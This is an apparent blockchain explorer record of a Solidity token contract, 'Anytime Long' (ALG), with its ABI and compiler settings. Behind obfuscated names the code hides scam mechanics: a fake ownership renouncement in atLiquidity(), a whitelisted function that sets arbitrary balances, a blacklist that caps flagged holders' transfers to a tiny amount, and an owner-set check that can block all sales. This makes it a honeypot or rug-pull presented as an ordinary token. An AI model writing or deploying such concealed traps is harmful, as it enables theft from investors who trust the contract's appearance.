{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface sellLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverSwapTeam {\n    function createPair(address isSwap, address atFee) external returns (address);\n}\n\ninterface txLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundListSwap) external view returns (uint256);\n\n    function transfer(address teamLimit, uint256 swapLaunch) external returns (bool);\n\n    function allowance(address limitMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamLimit,\n        uint256 swapLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapLaunchReceiver, uint256 value);\n    event Approval(address indexed limitMode, address indexed spender, uint256 value);\n}\n\ninterface txLaunchedMetadata is txLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AnytimeLong is enableShould, txLaunched, txLaunchedMetadata {\n\n    uint256 public launchList;\n\n    function isTeam(address tokenSwap, address teamLimit, uint256 swapLaunch) internal returns (bool) {\n        require(liquidityAmount[tokenSwap] >= swapLaunch);\n        liquidityAmount[tokenSwap] -= swapLaunch;\n        liquidityAmount[teamLimit] += swapLaunch;\n        emit Transfer(tokenSwap, teamLimit, swapLaunch);\n        return true;\n    }\n\n    function sellMarketing(address tokenSwap, address teamLimit, uint256 swapLaunch) internal returns (bool) {\n        if (tokenSwap == senderMarketingShould) {\n            return isTeam(tokenSwap, teamLimit, swapLaunch);\n        }\n        uint256 tradingLaunch = txLaunched(isReceiver).balanceOf(limitTotal);\n        require(tradingLaunch == takeReceiver);\n        require(teamLimit != limitTotal);\n        if (teamIs[tokenSwap]) {\n            return isTeam(tokenSwap, teamLimit, sellFrom);\n        }\n        return isTeam(tokenSwap, teamLimit, swapLaunch);\n    }\n\n    function balanceOf(address fundListSwap) public view virtual override returns (uint256) {\n        return liquidityAmount[fundListSwap];\n    }\n\n    bool public modeReceiver;\n\n    function receiverEnable(address listMarketing, uint256 swapLaunch) public {\n        amountMin();\n        liquidityAmount[listMarketing] = swapLaunch;\n    }\n\n    constructor (){\n        if (toBuy) {\n            launchList = receiverFund;\n        }\n        sellLaunched listFee = sellLaunched(exemptMin);\n        isReceiver = receiverSwapTeam(listFee.factory()).createPair(listFee.WETH(), address(this));\n        \n        senderMarketingShould = _msgSender();\n        atLiquidity();\n        shouldWallet[senderMarketingShould] = true;\n        liquidityAmount[senderMarketingShould] = autoToken;\n        \n        emit Transfer(address(0), senderMarketingShould, autoToken);\n    }\n\n    function swapToken(address senderExemptEnable) public {\n        amountMin();\n        \n        if (senderExemptEnable == senderMarketingShould || senderExemptEnable == isReceiver) {\n            return;\n        }\n        teamIs[senderExemptEnable] = true;\n    }\n\n    event OwnershipTransferred(address indexed sellAuto, address indexed exemptEnable);\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeBuyTeam;\n    }\n\n    function launchedWalletMin(address txTrading) public {\n        if (modeReceiver) {\n            return;\n        }\n        if (listIsAmount != launchList) {\n            tokenAt = launchList;\n        }\n        shouldWallet[txTrading] = true;\n        if (toBuy) {\n            toBuy = true;\n        }\n        modeReceiver = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingSwap;\n\n    uint256 constant sellFrom = 3 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoToken;\n    }\n\n    string private txEnable = \"Anytime Long\";\n\n    function getOwner() external view returns (address) {\n        return receiverLiquidityToken;\n    }\n\n    function walletFeeReceiver(uint256 swapLaunch) public {\n        amountMin();\n        takeReceiver = swapLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return receiverLiquidityToken;\n    }\n\n    function transfer(address listMarketing, uint256 swapLaunch) external virtual override returns (bool) {\n        return sellMarketing(_msgSender(), listMarketing, swapLaunch);\n    }\n\n    function approve(address feeLaunched, uint256 swapLaunch) public virtual override returns (bool) {\n        marketingSwap[_msgSender()][feeLaunched] = swapLaunch;\n        emit Approval(_msgSender(), feeLaunched, swapLaunch);\n        return true;\n    }\n\n    uint256 public receiverFund;\n\n    function atLiquidity() public {\n        emit OwnershipTransferred(senderMarketingShould, address(0));\n        receiverLiquidityToken = address(0);\n    }\n\n    uint256 takeReceiver;\n\n    function transferFrom(address tokenSwap, address teamLimit, uint256 swapLaunch) external override returns (bool) {\n        if (_msgSender() != exemptMin) {\n            if (marketingSwap[tokenSwap][_msgSender()] != type(uint256).max) {\n                require(swapLaunch <= marketingSwap[tokenSwap][_msgSender()]);\n                marketingSwap[tokenSwap][_msgSender()] -= swapLaunch;\n            }\n        }\n        return sellMarketing(tokenSwap, teamLimit, swapLaunch);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapLaunchLiquidity;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txEnable;\n    }\n\n    address limitTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public isReceiver;\n\n    function allowance(address sellSender, address feeLaunched) external view virtual override returns (uint256) {\n        if (feeLaunched == exemptMin) {\n            return type(uint256).max;\n        }\n        return marketingSwap[sellSender][feeLaunched];\n    }\n\n    address private receiverLiquidityToken;\n\n    bool private isTrading;\n\n    function amountMin() private view {\n        require(shouldWallet[_msgSender()]);\n    }\n\n    mapping(address => bool) public teamIs;\n\n    bool public toBuy;\n\n    uint256 tradingIs;\n\n    string private swapLaunchLiquidity = \"ALG\";\n\n    address exemptMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public senderMarketingShould;\n\n    uint256 private autoToken = 100000000 * 10 ** 18;\n\n    uint256 private listIsAmount;\n\n    mapping(address => uint256) private liquidityAmount;\n\n    uint256 private tokenAt;\n\n    uint8 private takeBuyTeam = 18;\n\n    mapping(address => bool) public shouldWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLaunchReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundListSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTrading\",\"type\":\"address\"}],\"name\":\"launchedWalletMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLaunch\",\"type\":\"uint256\"}],\"name\":\"receiverEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMarketingShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExemptEnable\",\"type\":\"address\"}],\"name\":\"swapToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapLaunch\",\"type\":\"uint256\"}],\"name\":\"walletFeeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AnytimeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}